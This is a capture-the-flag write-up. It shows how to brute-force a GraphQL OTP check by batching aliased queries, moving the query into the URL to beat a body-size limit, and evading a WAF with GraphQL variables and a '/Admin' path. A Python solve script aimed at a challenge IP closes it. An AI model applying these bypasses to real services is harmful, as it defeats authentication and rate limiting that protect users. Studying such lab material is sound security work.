+ Guessing a randomly generated number (OTP) between 000 and 998 (OTP check), repeating it for 40 attempts, accessing /admin, we can get the flag
+ This OTP check is limited per client IP address, allowing only 5 requests to be sent within a 30-minute period for each OTP check.
+ once the OTP check is successfully completed, the rate limit is reset, and the same rate limit applies for the next OTP check
+ The rate limit can be bypassed by executing multiple GraphQL queries in a single HTTP request
+  GraphQL aliases query example:
```
query {
  a: otp(u: "admin", i: 0, otp: "001")
  b: otp(u: "admin", i: 0, otp: "002")
}
```
+ The length of the request body is restricted, allowing for a maximum of 128 bytes.
+  The application uses express-graphql v0.12.0 as GraphQL server. According to its documentation, GraphQL query can be used not only in the request body but also in the HTTP query string. Therefore, by specifying the GraphQL query in query string instead of request body, it is possible to bypass the limit.
+ Since only the username admin is supported, so we need to specify u:"admin" as an argument in the GraphQL query. However, due to the restriction by the WAF string admin implemented in source/waf.js, this will return a response of "Wrong !!!" without the RateLimit header.
+ GraphQL allows the use of variables. Fortunately, with express-graphql, we can define the GraphQL variables in request body and define the GraphQL query in query string. Therefore, to bypass WAF, we can execute the following HTTP request
+ Finally, to get the flag, we need to access /admin instead of the /graphql GraphQL endpoint, and this endpoint is also affected by the WAF. However, we can bypass it by /Admin.
+ Solve script:
```py
import string
import requests
import itertools

requests.packages.urllib3.disable_warnings()
s = requests.Session()
# s.proxies = {"http": "http://127.0.0.1:8080"}

# BASE_URL = "http://localhost:7654"
BASE_URL = "http://34.84.220.22:7654"


def generate_strings():
    for size in itertools.count(1):
        for s in itertools.product(string.ascii_letters, repeat=size):
            yield "".join(s)


alias_names = [s for s in itertools.islice(generate_strings(), 1000)]
# generate ["a", "b", ... , "aa", "ab", ...]


def main():
    offset = 250
    for i in range(40):
        for n in range(0, 999, offset):

            query = ""
            query += "query myQuery($u:String!){"

            for j, otp in enumerate(range(n, min(n + offset, 999))):
                query += f'{alias_names[j]}:otp(u:$u,i:{i},otp:"{otp:03}")'

            query += "}"

            resp = s.post(
                f"{BASE_URL}/graphql?query={query}",
                json={"variables": {"u": "admin"}},
            )

            if "OK !!!" in resp.text:
                break

    resp = s.get(f"{BASE_URL}/Admin")
    print(resp.text)


if __name__ == "__main__":
    main()

```
